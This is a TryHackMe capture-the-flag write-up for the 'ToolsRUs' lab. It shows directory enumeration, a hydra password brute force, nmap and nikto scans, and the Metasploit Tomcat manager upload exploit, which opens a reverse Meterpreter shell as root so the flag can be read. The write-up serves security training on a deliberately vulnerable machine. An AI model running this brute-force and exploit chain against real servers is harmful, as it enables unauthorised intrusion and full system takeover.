# ToolsRUs Room Writeup
#pentest/tryhackme

We see on the main page:
`Unfortunately, **ToolsRUs** is down for upgrades. Other parts of the website is still functional...`

Let's start with **dirbuster** to see which directories we can find.

```shell
$ gobuster dir -u http://<machine-ip> -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.252.236
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/16 17:27:34 Starting gobuster
===============================================================
/guidelines (Status: 301)
/protected (Status: 401)
```

And that's what we  find in `/guidelines` -> *Hey bob, did you update that TomCat server?*
So we know we have a user called **bob** and that we apparently have a **TomCat** server. 

When we investigate `/protected` we are greeted with basic authentication. We know one potential username, which is **bob**, can we infer the password using
something like `hydra`? Use the `-f` flag to stop hydra execution after finding the first match.

```shell
$ hydra -l bob -P /usr/share/wordlists/metasploit/unix_passwords.txt -s port -f <machine-ip> http-get /protected
...
[DATA] attacking http-get://10.10.252.236:80/protected
[80][http-get] host: 10.10.252.236   login: bob   password: bubbles
[STATUS] attack finished for 10.10.252.236 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```

Nice, we found a password for our username! Let's try to login using the **bob/bubbles** credentials.
*This protected page has now moved to a different port.*

Interesting, another port you say? Sounds like we will need **nmap** to enumerate those.
Let's also use the `-sV` for service version detection since we are here.

```shell
$ nmap -sV <machine-ip>
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Port 1234 running Apache Tomcat looks interesting, can we login through the **Manager App** with the same credentials?
We can! Let's use **Nikto** with these credentials to learn more about our target.

```shell
nikto -h http://<machine-ip>:1234/manager/html -id bob:bubbles 
...
+ Successfully authenticated to realm 'Tomcat Manager Application' with user-supplied credentials.
+ All CGI directories 'found', use '-C none' to test none
...
+ OSVDB-3233: /manager/html/manager/manager-howto.html: Tomcat documentation found.
+ OSVDB-3233: /manager/html/jk-manager/manager-howto.html: Tomcat documentation found.
+ OSVDB-3233: /manager/html/jk-status/manager-howto.html: Tomcat documentation found.
+ OSVDB-3233: /manager/html/admin/manager-howto.html: Tomcat documentation found.
+ OSVDB-3233: /manager/html/host-manager/manager-howto.html: Tomcat documentation found.
...
```

We have found 5 documentation files. 

I think we are ready to attempt a shell. Let's use our good old **metasploit**.

```shell
$ msfconsole
```

What now? We know we are using Tomcat and we have the basic credentials. 

```shell
msf5 > search tomcat

Matching Modules
================
   ...
   #   Name                                                         Disclosure Date  Rank       Check  Description
   -   ----                                                         ---------------  ----       -----  -----------
   15  exploit/multi/http/tomcat_jsp_upload_bypass                  2017-10-03       excellent  Yes    Tomcat RCE via JSP Upload Bypass
   16  exploit/multi/http/tomcat_mgr_deploy                         2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
   17  exploit/multi/http/tomcat_mgr_upload                         2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
   ...
```

Module 17 looks reasonable since we already have the credentials.

```shell
msf5 > use 17
msf5 exploit(multi/http/tomcat_mgr_upload) > info
...
Basic options:
  Name          Current Setting  Required  Description
  ----          ---------------  --------  -----------
  HttpPassword                   no        The password for the specified username
  HttpUsername                   no        The username to authenticate as
  Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                         yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
  RPORT         80               yes       The target port (TCP)
  SSL           false            no        Negotiate SSL/TLS for outgoing connections
  TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be used)
  VHOST                          no        HTTP server virtual host
...
```

Let's set the required information:

```shell
msf5 exploit(multi/http/tomcat_mgr_upload) > set HttpPassword bubbles
HttpPassword => bubbles
msf5 exploit(multi/http/tomcat_mgr_upload) > set HttpUsername bob
HttpUsername => bob
msf5 exploit(multi/http/tomcat_mgr_upload) > set RHOSTS <target-ip>
RHOSTS => <target-ip>
msf5 exploit(multi/http/tomcat_mgr_upload) > set RPORT 1234
RPORT => 1234
msf5 exploit(multi/http/tomcat_mgr_upload) > info
...
Basic options:
  Name          Current Setting  Required  Description
  ----          ---------------  --------  -----------
  HttpPassword  bubbles          no        The password for the specified username
  HttpUsername  bob              no        The username to authenticate as
  Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS        <target-ip>      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
  RPORT         1234             yes       The target port (TCP)
  SSL           false            no        Negotiate SSL/TLS for outgoing connections
  TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be used)
  VHOST                          no        HTTP server virtual host
```

Seems like we have everything in place, let's give it a shot!

```shell
msf5 exploit(multi/http/tomcat_mgr_upload) > run

[*] Started reverse TCP handler on <your-machine-ip>:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying DsvOT9wzRvn...
[*] Executing DsvOT9wzRvn...
[*] Sending stage (53905 bytes) to 10.10.252.236
[*] Meterpreter session 1 opened (<your-machine-ip>:4444 -> <target-ip>:57016) at 2020-06-16 18:56:49 -0400
[*] Undeploying DsvOT9wzRvn ...

meterpreter > getuid
Server username: root
```

Not only we succeed, but we are root! What now? Well, since we are just looking for a flag let's try to find it. 

```shell
meterpreter > search -f flag.txt
Found 1 result...
    /root/flag.txt (33 bytes)
meterpreter > cat /root/flag.txt
ff1fc4a81affcc7688cf89ae7dc6e0e1...
```

And that's it! Thanks for following up this writeup! 